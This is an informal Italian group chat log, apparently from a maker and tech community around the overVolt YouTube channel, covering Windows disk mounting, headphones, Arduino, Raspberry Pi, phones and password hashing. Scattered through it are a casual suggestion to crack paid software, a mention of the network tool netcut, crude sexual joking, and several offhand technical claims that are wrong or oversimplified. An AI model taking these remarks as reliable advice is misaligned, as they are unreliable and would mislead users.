overvolt é l'unico canale che ha fatto un video con switchando, mi sembra normale che esca tra i risultati 
Beh i sonoff credo vadano bene
mmmeh
mi sa che ti tocca usare anche Switchando
Grazie 
Qualcuno che può aiutarmi un secondo con un problema del webhook ?
Eh ma se usassi google home mini?🤔
 ho provato a mettere Windows 10 su un server che mi avanzava ma ha un limite di 25 dischi...
Sono finite le lettere
È ridicolo
Non hanno pensato ad un
l+n?
Si esatto, ho ancora 5 dischi che non riesco a montare
Assurdo
Ecco perché non si usa win su server ahaha
su Linux monti quanti dischi vuoi
Fare una pool??
Non voglio fare RAID
mi serve avere ogni disco montato per conto suo
Ah beh. Ma sono davvero necessari 20 e passa dischi?
Le esigenze sono esigenze. Buono a sapersi questo limite
Ne ho 29 e me ne fa montare solo 24
Ora fi faccio ridere 
In windows server 2012 c'e' l'interfaccia metro
secondo me gli sviluppatori quando hanno deciso sta cosa erano sotto mdma
Infatti non devi usare le lettere in quel caso
che devo usare?
 c'è un problema... Conosci diprix?
volume mounting
che e'? na malattia?
Lo monti come su Linux
Uguale
a me serve una lettera per disco, non raid o ste robe qui
Che raid
Invece della lettera gli dai un percorso
Tutto qui
dove devo andare?
Sotto c'è la guida step by step
Ora provo
Dalla gestione partizioni
Da qui cambio?
Yep
Ok grazie
Niente
chebbelle le tendenze di iutub, io voglio morire
Video per ignoranti, inoltre
ma a me dispiace anche per quelle povere cristo di mosche
morte di ipossia
Grazie, cel'ho fatta 
Hard disk da 50tb??
Esatto
Che muoiono più di volare
si appunto, prima di arrivare al vuoto sono già morte per 25 altri motivi, tipo 1.)ipossia 2.)gli si bolle il sangue 3.)la differenza di pressione che le fa fuoriuscire da ogni orifizzio il sangue...e poi se volano grazie alla cazzo di aria perchè puoi anche solo pensare che volino nel vuoto, cribbio quanti schiaffi a uno così
bro ma levali tutti e metti la path su C per tutti quanti...
cos'hai fatto giusto per sapere?
li sto riorganizzando
gli ho spiegato come aggiungere un disco su Windows senza assegnargli una lettera, ovvero montarlo su una path, come su Linux
che quando ne hai tanto è praticamente obbligatorio
Avevo finito le lettere ahaha
si ma così mi sembra un po' esagerato
su un server è abbastanza normale
È il NAS 
NAS con Windows?
ma per quale ragione al mondo lol
cioè pure mio padre che è un fan della Microsoft ha messo Linux sul NAS in ufficio
Prima c’era freebsd, sto valutando un po’ di os, ho detto tanto vale provare anche questo benedetto Windows 10
Windows 10?
Così tanto per
Meglio Windows Server per queste cose
non ha tutta la roba inutile e i bloatware di Windows 10
Volevo solo provare l’os non utilizzarlo come nas
e ha dei tool utili per i server
no ma tranquilli che non mi sto chiudendo su Switchando Cloud da 4 ore di fila
Nope
Ha pure la tua bio uguale identica con dei cambiamenti
spam
Ragazzi scusate ma in macchina virtuale posso eseguire tutte le istruzioni Assembly senza recare danno?
ne avevamo già parlato, che ci vuoi fare...
Ah srry
Perchè dovresti arrecare danno con assembly?
Vabbè non è che sia chissà quanto originale 
eeehm sì?
L'ho appena notato cercando un video di overVolt
ognuno fa I video che vuole
Ma che cos, di certo non identici
Ho trovato delle istruzioni che fanno andare il processore in triple fault, volevo provarle su macchina virtuale
Su vm puoi fare tutto quello che vuoi
Chi lo dice?
Quindi male che va crasha la macchina virtuale?
La ragione
Sisi
in teroia muore la VM
altrimenti che VM è scusa
sono fatte a posta per avere un ambiente sicuro
Che comunque non rimuove i video. overvolt dovrebbe registrare un brevetto per quel format
sai vero che non è stato il primo canale a portare una serie simile sull'IoT vero?
Non è stato chi?
Bah
che non è il primo canale al mondo a portare quel format
Ah ok, perché pensavo che di registri ne abbiamo solo una copia, cioè non ci sono rax,rbx, rcx virtuali. Mi dovrei documentare meglio perché vorrei chiarire questa questione
se vai su youtube america ne trovi a centinaia

AHAHAHAHAH
Io dicevo solo che se l’altro tizio copia così tanto, Marco dovrebbe registrare un brevetto su quei video
Beh ovvio, non ha senso registrare brevetti per web content
Altrimenti non si può fare nulla
ma quei 14 sono palesemente i suoi cug(g)ini / amici / genitori / zii di quindicesimo grado
Cuggini is the way
Io sono stato il secondo iscritto ad overVolt ☺️
Esistono delle regole
Il primo è stato Francesco
ah ecco
Ricordiamoci che tutti partono da 10 iscritti
E dei copyright, è palesemente copiato
 per curiosita,quanti anni hai?
Se non registra un brevetto non può fare nulla
16
Che nostalgia quando:
a:\ era il floppy da 5 e 1/4
b:\ era il floppy da 3 e 1/2
c:\ era l' hard-disk da 40 Mb
A-haaa! Ecco perché si chiama C
non lo sapevi? 
Immaginavo che qualche ragazzino non lo sapesse....
Buona sera a tutti...
Buona sera
io neanche la sapevo questa cosa, purtroppo io credo che non ero neanche nato ai tempi degli hdd da 40mb
Scrivete tantissimo
OT: qual'è la vostra opinione su Buffon?
Ci trovo sempre molti messaggi.
è un figo indipendentemente da quello che faccia
pensa noi admin che li dobbiamo leggere tutti 

Aee
Allora ragazzi avrei una domandina devo fare un progetto scolastico per un tamburo che bussandoci sopra con una certa sequenza un arduino tramite un piezo riconoscere gli input e li conta la domanda è devo ancora prendere il Piezo va bene uno qualsiasi Secondo voi e soprattutto lo devo mettere esattamente sotto la membrana del tamburo o basta anche che sia in fondo a un tamburo sarebbe un tamburo piccole tipo 10 cm
Scusate una domanda un po' ignorante: quando ti registri in un sito le password non vengono salvate in chiaro ma vengono "hashate" (credo si faccia ancora così), però poi come fanno a trovare la password in chiaro dall'hash visto che non è reversibile l'algoritmo?
Fanno il contrario, trovano l'hash della password immessa e la confrontano con quella salvata
Quindi è un confronto di hash?
Helpatemi
Devi prendere le cuffiette Xiaomi da 20€....ma quali?!
Yep
Ahh ok grazie mille
Figurati
 te hai quelle da 20 giusto?
Hybrid Graphene
This?
nope
Ma stanno su Amazon?
Fatti mandare queste romboli
ovunque
Queste sono quelle vecchie
Mmmmh sono grosse
Adesso cerco, grazie
Sono più arrotondate anche se molto simili
Queste sono quelle che hai screennato, le ho anche recensite su YT e sono buonissime ma è uscita la nuova gen 
No, non ci sono su Amazon....isolano bene? Il suono?
Allora prendo la seconda generazione, perché non posso aspettare un mese e pagare più di 10€ di differenza, devo ancora comprare cassa e cuffie buone 
Queste sono quelle nuove
Io le ho provate, le ho trovate ottime, hanno un isolamento da paura
Come fanno a essere buonissime se costano 26€
La qualità la fa il prezzo? 🤔
E come fa il Mi Mix 2 ad essere il telefono più potente al mondo se costa ⅓ di iPhoneX?
Xiaomi 
Grazie mille, a sto giro compro con il referral visto che mi hai aiutato
Ma quello è un telefono
Bisogna anche dire però che Xiaomi mi A1 è uno dei telefoni con maggiorj radiazioni
❤️
Hai mai provato un paio di Sennheiser / Audio Techinca prima di dire che sono buonissime?
La manodopera, il brand....
Perché di solito no? 
Non faccio spesso compere
Si e no
 appena mi arrivano questi auricolari ti dico il confronto con le tue cuffie
Alla fine hai preso le Sennheiser che ho io?
Io volevo fare una cosa simile con il citofono,suonando il campanello con la giusta sequenza di suoni corti/lunghi si apre l' elettroserratura
Non ancora, sono tipo iperattivo indeciso, e ho un botto di cose da comprare
Prima mi tolo le cuffiette
Poi cuffie
E casse
Quanti soldi 
Sinceramente se ascolti molta musica e la vuoi ascoltare come si deve, te le consiglio, a quel prezzo non trovi di meglio
Tra le cuffie sono indeciso con: le sennheiser di Marco, le Beats, major 2 e audio technica
Togli le Beats
Ne ascolto con troppa, credimi, minimo 8h al giorno
Eh ma io adoro i bassi
Le mie se le vuoi usare anche sul cellulare
Pare che le Sennheiser non ce li hanno
Le major ho letto che sono mooolto fragili
Sappiamo tutti che le Beats sono solo bassi
Ma infatti evita le Beats
Appunto
Io parlo di Marshall 
Ah, le Marshall sono ottime pure
Le audio technica invece sono cuffie monitor
Non sono il mio stile, ma da quanto ne so, non sono male
Assolutamente no, anzi
Solo che se sono fragili no
Rischio di buttare 60/70€
Madò, che delusione sentire i morti nella propria terra sul tg1
Per quella puttana dell'Ilva
Rip
E allora pigliati le Sennheiser / Audio Techinca
Esatto
Quelle col cavolo che le rompi
Le audio technica sono studio
Infatti quelle le devi usare al PC con tanto di scheda audio se vuoi il massimo
Seee
Statt buen
Ho la scheda audio USB cinese che devi smontare per farci una cosa se vuoi 
Quella da 2€ e manco
Guarda
Il DAC della scheda madre al 99,9% suona meglio
+0,1
 beh se hai le mobo che hanno i preassemblati che abbiamo a scuola no
Secondo te quale dovrei prendere tra le due?
Ahahahahahah
Ho un portatile.....rip
Ti dico solo che senti i disturbi dell'attività di processore e HDD nelle cuffie
Perché son appassionato di sicurezza
Eh la madonna, non sono PC cazzo
Queste
Le ho provate
La scatola per alzare il microfono è un tocco di classe 
Yess
Solo che con quelle d'estate non ci rimango due ore
E pensare che a poco meno vendevano il Blue Snowball che suona meglio e ha l'asta integrata
Sto in Puglia cazzo
Sai come mi ritrovano?!
Come mai non l'hai preso?
Eh pure questo è da valutare, però essendo di gomma hanno un noise cancelling passivo ottimo
Perché l'idea iniziale era di tenerlo così
Poi però ho scoperto che così si sente di più la tastiera della mia voce
Ahahahahahahah epic fail in poche parole
E soprattutto alzando il gain aumenta pure il raggio, e i miei amici sentivano mia madre parlare, che io non sentivo
Mettendolo vicino alla bocca con un gain molto basso invece è top
A differenza Delle audio technica che sono studio
Basta che mi alzo dalla sedia e non mi sentono più, la tastiera non si sente manco a pagarla, top insomma
Ma non ti dà fastidio?
No
Se lo dici tu 🤷‍♂️
Riesco anche a programmare con quel coso davanti
Io non gioco e risolvo il problema
buonsalve
I(pine)apple
best way di tenere su il microfono
Il cellulare non si carica piú da acceso... Solo se è spento si carica...  Mai successo a voi?o sapete come risolvere?
Prova a cambiare caricabatterie
Giá fatto
Il problema è che mi dice in carica... Ma non si carica
Ah uhm.... Io ho lo stesso problema
Ma è un fucking casino
Ho letto di scaricarlo del tutto metterlo in carica... Accenderlo e riscaricarlo del tutto... Per alcuni giorni
Poi bo
Avranno progettato il telefono in modo che consumi esattamente la corrente che gli dà il caricatore 
Non mi aveva mai dato sto problema 🤔
Ho provato a ripristinare ma da lo stesso il problema
Prova così... Ma io sto vivendo con l'ansia da telefono in carica
Mi sa che presto avremo un altro drone Eachine da recensire 
Eh... Io ieri sera ho visto che non caricava.. ho detto aspetto 5 minuti e vedo se sale... Minchie mi sono addormentato e stamattina batteria al 30% 
Help
Settori andati ormai 
nulla da fare dici?
io voglio provare a salvarlo, pensavo ad un cambio di firmware
Scusate, il mio pc non supporta windows hello ma vorrei metterci un sensore per le impronte digitali usb per sbloccarlo
come devo fare?
Neh
Forse mettendolo in posizione di riposo e riavviandolo
Ma non so
Mettilo, ti dice che non lo supporta proprio perché non hai un dispositivo compatibile
se lo attacchi dovrebbe accettarlo e lasciartelo usare

me ne passate uno economico?
in che senso di riposo?
con la puntina nella plastica dici?
lo fa da solo, non c'è quel problema li
dunno, invoco 
 che ne aveva preso uno
Ci sono anche versioni per rasp/arduino?
Allora bo
Giu non complicarti la vita... Attaccalo e avvia CAINE salva eventuali file da salvare... E poi buttalo passa ad uno stato solido
ma io ho un HDD da 2TiB e un SSD da 500GiB di già ma volevo salvare la vita a questo pezzo da museo perchè mi serve un altro HDD staccato non potendo usare partizioni degli altri 2
e non voglio comprarne uno nuovo ._.
Ah ok...


Upgrade to Galaxy spacca 
Indeed! Every-time



by 
capita molto a me 
Buona giornata a tutti...
ma oggi scrivete pocooo
buondi
quando scopri di avere ancora l'installer di Visual Studio 2013 nella cartella Downloads
che poi sto PC è del 2017... Mi sa che ho backuppato troppa roba dal vecchio
l'installazione di visual studio penso sia la cosa più lenta che ci sia nel mondo
L’universo in confronto è giovane
Guarda, con la 2017 sono migliorati
Con la 2013 e la 2015 ci avevo perso un pomeriggio
io avevo installato il 2015 e quando è uscito il 2017 non ho avuto il coraggio di installarlo
che dite... WSL o VMWare?
non ditemi di installarlo in dual boot perché sono uno che non riavvia mai il PC, spesso lo lascio acceso più giorni
WSL
Al massimo kvm o qemu
Io non ho mai capito come usare qemu
per le mie vm mi sono sempre affidato a VMWare
Ed anni fa usavo anche un po' virtualbox
io ho semprebusato vmware
Sisi anche io , mi ci trovo benissimo
poi col pc nuovo riesco a farle andare a due alla volta
io ricordo l'installazione della 2015
UN INCUBO
no,l'installazione di unity e piu lenta
RIP sicurezza Android
La 2010 non era male , anzi l'ho usata fino a pochissimo tempo fa, all'uscita della 2017 perchè mi facevano cagare quasi tutte quante
AHAHAHAHAHAHAH
Verissimo
io ho 2015 e dato che e pesante mi lagga un po,per testare i codici uso il dev c++
Madò che roba
unity lo installavo in 5-6 ore 
a me non c'è manco google assistant
Meno male 
ho ancora la 5.0.2
e samsung di merda non rilascia updates
tra l'altro il telefoino della mia amica , più vecchio di 2 anni marshmellow lo prende
nokia 6 top 
tra l' altro il j3 2016 mi pare sia uscito in concomitanza con marshmallow
raga ditemi un gioco da fare senza la grafica,sto morendo dalla noia e tutto quello per console nel internet ho fatto.
Muori dalla noia? Cancella e reinstalla unity e vedi come ti tiene impregnato
oppure pornhub is the way
io non ho unity nel pc.. lo ho cancellato da anni 
fai campo fiorito
volevo.. ma il cell e rotto e non posso usare il cell di mia sorella 
e che problema c'è
ecco a cosa serve il pc
eh ma i miei vedrano tutto 
mia sorella puo prendere il cell quando vuole e non riusciro a chiudere tutto 
wut
intendi la cronologia?
no.... il video
Ah ahahahah
non sono un brutto figlio di merda
non posso fare cose del genere 
se è fisso è un problema
Attento a non bruciarti gli occhi
anche con notebook ce il rischio,ho la casa piccola  (anche se non ne ho un notebook..)
Ahhhhh
vabbe trovato il modo. Vado a immaginarmi un brazzers threesome 
AHAHAHAHAHAH
GENIUS
PornHead premium
Ahahahahah
devo solo ricordare di non aprire tanti tab se no il cervello mi laggera e possono succedersi dei crash e possono succedere cose brutte,quindi dovro stare attento 
eh si
soprattutto se hai il cervello chrome
ti finisce la ram
ahah
poi scopro che ho beccato un virus,o ho aperto un link che non mi fa uscire da quel mondo O.O
ahahahahah
che brutto non avere idee 
Riconosce il timbro vocale
Peccato che il telefono fosse il mio e lo ha sbloccato il mio amico
ma con un pennello di seta morbido non si rischia di sfottere i componenti?
Nelle impostazioni c'è la possibilità di sbloccarlo con l'ok google, in generale e con il proprio timbro
Ho controllato ed è disattivato
Allora ha qualche problema il cellulare
Ma sblocca completamente il cellulare?
Ho provato anche con galaxy s7 mini ed è uguale
O si limita a qualche funzione
Si
Lo sblocca tutto
Da me funziona bene
Bho
beh, per essere precisi l'unità di misura del tempo che ci ha messo l'universo a formarsi è il tempo di Planck, che è un miliardesimo di miliardesimo di ... di secondo 
quindi è la cosa più veloce che ci sia stata
si vede che pochi secondi prima l'hai sbloccato con l'impronta digitale 
Lo sblocca e poi lo riblocca
Modificato
?
ho aggiunto la riga che vedi sotto, il "quindi..."
Attenti a parlare di tempi
Il tempo è relativo o sbaglio?
È lo sblocco con la voce
lo sapevo che ti saresti triggerato ❤️
Non sono io a sbloccarlo e si sblocca comunque
La stessa cosa o sbloccato un Samsung galaxy s7 mini di un altro mio compagno
❤
E comunque l’opzione non è attiva
Soprattutto perché la formazione dell'universo non è ben descritta dalla meccanica quantistica
E la relatività generale non è quantizzata
Apriamo una nuova rubrica sul canale di OverVolt? 
Marco non apprezza
Le chiama "bah cose da fisici"
Neanche una rubrica sulla Fisica Quantistica piccola piccola?
Convinci marco 
Ma son video pallosi che non fanno views insomma non ne vale la pena 
In caso mi apro un canale tutto mio 
Trovare reti Wi-Fi aperte ci fa sempre piacere.
Ma cosa rischiamo a connetterci?

 fai un video di haking a riguardo in futuro
Basta non andare sui siti con http
Si, ok. Era solo uno spunto per un nuovo video
aveva già fatto un video sulle VPN

Io ho deciso,vado a fare un sito tipo pornhub con php(come facebook)
raga, come esporto da indesign con la trasparenza?
che capp è indesign? 
ex illustrator
Non sono la stessa cosa
infatti, c'entrano poco e nulla l'uno con l'altro
si invece
ah, no
hai ragione
cioe yesn't 
yesn't*

ah vero srry 
io che guardo e dico cosa non va? 
non ho mai detto yesn't quindi ho sbagliato 
hiiiiiiiiiiiiiiiiiiiiiiiiiiiii
ragah  ma programmer humor posta tante cose belle perche ha cosi pochi utenti?(forse perche non tutti capiscono i post )
They're not the same!



by 
perchè non postano su Telegram loro
loro postano su Reddit, è lì che hanno l'utenza maggiore, il canale Telegram è gestito da un bot che non fa altro che inoltrare i reddit sul canale
if (java != javascript)
   {
     Magic
    }
else?
Normalità
ah
if (java != javascript)
   {
     Magic
    }
else
      {
       Bug....
      }
else{
return shit;
}
Lo metterò su github
ragazzi se scrivo class <nome>{ public: } <nome> e lla stessa cosa se  scrivo struct <nome>{...} <nome>; vero?
Assolutamente no, classi e struct sono cose diverse
okk
In effect, structs are about data, classes are about code.

sarebbe questa la differenza principale?
 Cosa devo aggiungere al link per farti fare un po' di soldini? (Link Amazon)
solo a me nn va spotify sulla chromecast?
in questo momento?
hai premium?
ovvios
strano 🤔
ho riavviato e fatto tutto
Qualcosa forse non ha funzionato....
Basta che butti il link qua su MakersITA in realtà... Il bot lo trasforma, tu lo apri e lo aggiungi al carrello
Sono sul PC di mio padre
Ho aggiunto quella stringa, ma è come se l'eliminasse

Qualcuno è stato in fiera Milano?
Io oggi ho vinto un kit oculus go
Seee
 solo da 26
Se seleziono quelle da 24,90 non vedo più il tag
devi rimetterlo tu, la pagina si ricarica e sparisce
Lo sconto studenti di oneplus è del 5% sugli smartphone?
Dovrei esserci riuscito
Ho scoperto ora netcut
Sono contento
chi di voi parla russo?
con l'alfabeto strano
(credo sia alfabeto cirillico, non mi ricordo come si chiama)
 ho comparto pure una cosa da 15 con il tuo URL adesso
wtf
15 cosa? Mele? Pere?
fragole, mi sembra ovvio

Raga ma chi si ricorda kezo
oddio
secondo te è lui?
a meno che non abbia cambiato username, no, di solito è 
 con tantissime i
perfettoo non è lui ahahah
azzo mi sono dimenticato di rimettermi il cognome 
E' bella la parte dove dice "Questa è una prova"
Si infatti è spettacolare
Question approva
io preferisco di più quando dice "questa è una prova"
Sarà pure ma vuoi mettere quando dice "Questa è una prova"? Mi si è irrigidito il membro!
Ho sbagliato persona, Sorry 
here
si proprio lui
Volevo taggare te e ho sbagliato persona
si dicami
No, per il fatto del cirillico
Ma te sei sparito?
Prima eri molto più attivo 
prima ho trovato in garage un libro che ti spiega passo per passo come funzionano tutti i satelliti meteorologici e come creare un circuito per connettercisi e salvare le foto su una chiavetta, credo sia un pelo illegale e che da quanto è vecchio quel libro tutti i satelliti citati e usati come prova siano ormai dei detriti spaziali ma ci sta
è che sto lavorando al nuovo garage, mi faccio la mega officina in casa mia cosicchè non devo andare sempre in bici da mia nonna per usare un morsetto
a e oggi ho appurato di avere 2 hdd morti, qualcuno li vuole?
ho fatto, comunque thx
call of duty era in russo 

 roboto bold o roboto thin?
perchè illustrator mi esporta il file più grande del dovuto?
Ma che cazz
Quello che vuoi
Guarda quello che ci sta meglio
Tuo nonno è radioamatore?
Non è illegale ricevere info dai satelliti meteorologici.
bella, comunque mio zio
Facci un ventilatore
Figo!
faccio uno specchio
riflette mille volte meglio dello specchio di casa il disco
Che devi farci? 
Eh la madonna ahahahahah
Quando non c'era internet bisognava aggiustarsi.
Ora un sacco di siti pubblicano le immagini dei meteosat.
Ed in più ci sono i radar meteo, utilissimi per sapere la posizione dei fronti temporaleschi che usiamo per collegamenti rainscatter
prima ho letto qualcosa di quel libro e ora ho troppa roba in testa tipo i segnali apt
e l'antenna QFH sembra un'opera d'arte di quelle francesi, tanta roba
È lo zio di qualcuno in questo gruppo giusto?
tipo identico a mio zio
Dopo questa freddura direi che quello che dovevo scrivere lo scrivo dopo
Riguardo alla riprogrammazione del sonof, se cambi il fw non puoi più connetterti con la app perché perde le impostazioni per il collegamento al server eWeLink 

tuo zio è? 
è dio ù-ù

in tutto ciò io stavo pensando...se mi serve un amplificatore valvolare semplice(1 o 2 entrate e 1 o 2 uscite con i vari potenziometri per amplificazione e tutto) dite che sarebbe un brutto colpo al portafogli? no perchè ho il braccino abbastanza corto, tipo t-rex
Android Things?
A cosa ti serve il valvolare?
Ad amplificare segnali che poi vanno all'antenna e anche per amplificarmi la musica per le casse da disco che ho nello scantinato
È comunque un bel pushpull di kt 88
Si ma io ho si e no 70 euro
Ciao adios
Eee credo di dover poter amplificare un bel po'🤔
Non ci paghi le valvole con 70€
Naah ho trovato roba su quei prezzi da montare
Tipo che ti danno i pezzi e tu ti saldi tutto
Io non ho problemi ha prendermi un piccolo kit
Si ma guarda che li poi ci girano 400v
Appunto, nulla di più safe :D
L'importante è che mi amplifichi il segnale senza aggiungerci rumore ok
Non penso sia un amplificatore valvolare quello che cerchi sinceramente
Cosa mi servorebbe allora
Poi il valvolare lo uso anche principalmente per musica eh
Già ne ho uno ma pesa tipo 9999kg ed è da mia nonna quindi...
Ah non ne ho idea, solo non ho mai sentito di valvolari utilizzati in quella maniera
Why not, sempre amplificatori sono
 Che significa cyka blyat?
Allora al ripetitore in calvarina ho capito perché ci sono sempre concerti 
No queste domande però
Ma che ne so io 
Apposct
Ok, cerco su internet
Google translate non ti piace ?
Rush 🅱️ Cyka Blyat
Serata spettacolare  servizio sicurezza VVF per Italia-Australia 
AHaHahAh QuEStA E faIC xKE Ai iL RaSVeRRi nN CoLleGAtO
È stata dura da scrivere
OMG che falzoo
 ero proprio dietro la postazione Rai con il mitico Lucchetta
ncredbbile!!1!11!1
rasverry mi mancava 
come far felice la fidanzata..farle fare la foto con Baranowicz
potere della divisa

Non sapevo come altro scriverlo
visto Fil? ero proprio sul parquet
comunque si scrive colegatto, almeno l'itagliano qui
Figata
ti ividio hahahaha 
c'erano anche i trentini 
mamma mia che partitone, l'Australia è fortissima
mi sono divertito tantissimo 
AHAHAH
accanto a Gabriele Nelli mi sentivo un nano  2.10 metri, 53 di piede e 100 kg di giocatore..praticamente una porta
Che brutti i piedi grandi
è un pallavolista di 2 metri e 10  mica può portare 40 di piede
A me piacciono i piedi piccoli ahaha
Abbiamo un feticista 
In questo gruppo saranno almeno un centinaio, statisticamente parlando
1/6 
Ora che vedo meglio il 26% degli uomini sono feticisti
Cos
Quindi 160.42 persone, arrotondiamo a 160
🤔così pochi?
Allora sono fortunato...
Eh già. Pochissimi lo ammettono ma è così
Non direi, eccitarsi per tante cose diverse rende l’atto meno monotono
...i piedi sono piedi...li ho pure io...
A molti piacciono quelli femminili

Mio zio si autoproduce degli amplificatori valvolari spettacolari

Ok, ADORO questo gruppo
se mi davano la possibilita spammavo offervolt `.`
I problemi della gente
Problemi?
Mi sembra tutto men che normale ahahha
Ma dov cazz siam finiti, in giappone?
come fai a cercare "foto piedi" di più che "foto tette" 
Vado ad iscrivermi all'Associazione Italiana Protezione F*ga, cia
raga meglio mac o winzoz?
dipende per cosa ti serve
se dovessi avere un budget illimitato, ti consiglierei mac, dato che poi è semplicissimo fare un dual boot con windows
mac=video editing/ foto editing/ audio editing ed altre cose professionali
windows= cose semplici si, editing anche ma nn professionale come finalcut
poi puoi fare sempre bootcamp
definizione molto semplice
beh, su Windows c'è tutta la suite Adobe, più che altro i software per mac sono più ottimizzati
ebbene si, uso finalcut da anni
na bomba
ok,macbook o laptop windows?
forse domanda da ignoranti,ma intendo se un macbook e bello 
ber essere bello aivoglia
ma mac ha piu funzionalita o windows?
o ognuno ha i suoi vantaggi?
e un ultima domanda,come un work laptop,cioe un laptop che non lagga dai prog come cyberlink o che visual studio non va lentamente, uno di 200-300 euro va bene vero? e.. windows starebbe meglio vero?
Si ma perché proprio la suite Adobe non è ottimizzata, se usate programmi fatti bene come davinci resolve per il video editing Windows e ottimo ed è pure gratis davinci
Molto meglio di Adobe Ae e fcpx
Invece è normalissimo
Sei tu che hai una mentalità chiusa
ah perchè Adobe si paga? 
Certo
Bhe è a pagamento poi se lo cracchi...
la colla a caldo conduce energia elettrica?
No, è isolante
perfetto
grz
Giorno a tutti, potreste darmi una mano a capire che driver board dovrei usare o almeno che connettore usa questo schermo:LTV350QV-F02 ?
Ho guardato il datasheet ma non ci sono riuscito ancora a capirlo

La versione gratis ha tutto o manca qualcosa?
No non ha tutto ma ha molta roba
Quindi lo consigliate in sostituzione di premiere?
Perché siccome sto ancora imparando se mi dite che è meglio comincio subito con davinci così mi abituo direttamente su quello
*ilsuperuovo*
satto
Si io ti direi di sì, e usato anche in ambito professionale soprattutto per la color correction
buongiorno
Buongiorno, qualcuno sa se è possibile togliere una password da un file 7zip?
non penso
Certo, bruteforce
Spero non ci fosse roba importante
Si
Mi dispiace
C'era un exploit
raga ,domandina, com'e che lasciano usare linux alla gente se col terminale puoi usare un keylogger e ricevere i dati?
o che con un exploit puoi hackerare i pc che non sono stati aggiornati da una falla?
Exploit per AES-256?
No. Blueborne un exploit per entrare nelle directory di dispositivi, avende solo acceso il bluetooth
Ma oggi usciva il video?
Cosa c’entra con la password di 7zip?
Perchè è compresso forse?
Se metti la password i files vengono crittati con AES-256, e non lo rompi
A me mi serve la password........
L’unica cosa che puoi fare è bruteforce
Una rottura di maroni
Se non fosse così, non avrebbe senso la crittografia
E sii..
Effettivamente
Nuovo video! 
 


 
Guardalo ora! 
Si è rotto il bot
Povero rasp, chissà come soffre
Cattivo bot
Raga attenti che potreste aumentare il riscaldamento globale

In realtà vuol dire porca puttana, blyat da solo è cazzo

Che c'è? Non è colpa mia se su csgo mi fanno lezioni di russo 
io ho un russo in classe
Ho imparato il russo con quel gioco
comunque non mi convince android per iot, troppo, troppo pesante
già me lo vedo a richiedere 6gb di ram solo per accenderti le luci in casa
avrei gradito un sistema operativo a parte che puntasse ad essere leggero ed ottimizzato
Persona sicura = machine learning
Anche io ho imparato il russo su cs xD
Neural Network Algorithm*
mannaggia, si vede proprio che dobbiamo rifarne uno nuovo 
ragazzi ce tanta differenza tra android 7.0.1 e android 8.0.0?
troppa
WOW
ho comprato nokia 6.1 che e android 8
nokia 6 ha android 7.0.1 e il processore e 1.4 ghz,quello di nokia 6.1 e 2.2 ghz,bello no?
raga è possibile far funzionare un microfono su arduino?
Help chi sa dirmi cosa significa?
yes
Introducing the new and improved inequality operator



by 
Sta sfuggendo di mano
Perché fa così? Il Rotary encoder va sempre dallo stesso lato pur se lo giro al contrario
Ciao ragazzi, non ho mai programmato in phyton e credo che questa sia l'occasione giusta per iniziare

Mi serve tenere sotto controllo (1/2 volte al giorno è sufficiente) una pagina web e verificare quando compare una parola.

Quando comparirà vorrei inviata un'email

Il linguaggio più appropriato è phyton secondo voi ?

Dove posso hostare (meglio gratis) questo piccolo script/bot ?
python va benissimo, per l'hosting puoi usare Heroku (gratis)

Grazie Filippo

Uso qualche IDE particolare o vado di notepad++ / SublimeText ?
io ti consiglio PyCharm, poi vanno bene tutti
Grande, gentilissimo 
di nulla 
qualcuno mi sa aiutare?

Qualcuno saprebbe consigliarmi una scheda madre nuova per il mio syma x5sc?
sembrerebbe che il giroscopio sia andato
vai spara


🤣🤣🤣🤣🤣🤣🤣🤣🤣
Help qualcuno puo dirmi cosa  e successo?
Se ci dici sistema operativo e contesto potremmo aiutarti
E un android il modello e lg l80
Lho tenuto spento una settimana e oggi quando lho acceso mi ha dato questa scritta mai vista prima d'ora
Ah ma è un telefono?
Si lg l80
Prova a togliere la scheda sd
Non ce la scheda
Ah... Avevi modificato qualcosa? Rom, bootloader o altro?
No

Ecco, stesso modello
È un errore che compare in questa serie di LG
Si esatto e questo praticamente devo rinstallare android
ragazzi ma nessun prog / gioco va nel android 8.0? 
nemmeno telegram installa nel android 8.0
Ciao, ma posso programmare un display a sette segmenti con il raspberry?
Si
Yeee, ma oltre a quello cosa mi servirebbe?
Basta che lo colleghi ai pin gpio
Senza resistenze
?
Dipende dal display
Ok
Grazie mille
Sono un misto tra le due, come mi posso definire?
Realista
Perfetto
Credo di si... che tu lo possa comandare
Con 4511 puoi farlo con 4 pin
Il caro vecchio convertitore  bcd  7 segmenti...
Sì infatti... controlli con 4 pin
Ho costruito un mini circuito con multisim
Deve solo vedere se il display è a catodo o anodo comune
Perché sennò deve usare un altro convertitore 45xx
Il 4511 e per il catodo comune
Raga ma google assistant non va in armenia,perché ? Che problemi ci sono?
Vi ho fatto già vedere il radar
Lo schema del catodo comune e semplice... il 4511 e facile da utilizzare
4511.png (575×312)
3 ingressi di controllo LT BI e LE
LT = LAMP TEST
LE = LATCH ENABLE
BI = BLANKING
Rispettivamente... test led, memoria attiva sull'ultima cifra, spegnimento
Ma il cluster é un tipo si supercomputer?
raga come si chiama quel sistema che si mette sul raspberry per farlo diventare tipo chromecast???
help
ho trovato, volevo solo sapere una cosa. Qual'è la massima risoluzione del raspberry? Tipo il fire stick basic la max risoluzione è 1080p.
Scusate l'ignoranza.. volevo chiedervi come fare per non far bruciare un componente per l'alta corrente
Ad esempio: 
se io volessi alimentate un motorino con 19V come faccio a non farlo bruciare?
Se li supporta non si dovrebbe bruciare
Non credo li supporti
Usare delle resistenze?
A e comunque ciao, questa mattina i miei si sono alzati e mi hanno trascinato a Jesolo al mare e ora sto in un hotel che è il primo che abbiamo trovato accasissimo
E niente...bello il mare
è bello soprattutto quando sai che il giorno dopo avrai verifica di chimica
Guardate che figataa
Raga
Non riesco a reimpostare l'imei del cellulare... Qualcuno sa come fare? Sulle impostazioni apposite non trovo la voce cds information
l'imei non può essere reimpostato, è un ID univoco del dispositivo
Riflashando la rom si era cancellato... Adesso ho rimesso quello suo scritto nella scatola
Ci ho perso le ore... Hanno cambiato la voce dell'impostazione
Lo split screen?
Si
Perché non hai provato il picture-in-picture 
Come?! Non ho mai capito
Da mo che lo uso...
Kodi
Non ho capito come si fa
Lo fa automaticamente
Hai P?
Apri un video con chrome e poi premi il tasto home
Il PiP c'è già con Oreo
Ah
eh ma da me non succede xD
Vai nelle impostazioni dei permessi e abilita il PiP
Se hai Oreo deve funzionare
Ecco beh
surprised i didn't see this one yet



by 

già...
ma questo ha già più senso, in python esiste l'if not 
ma l'yesn't no
Non ce :(
dalla regia dicono molta privacy
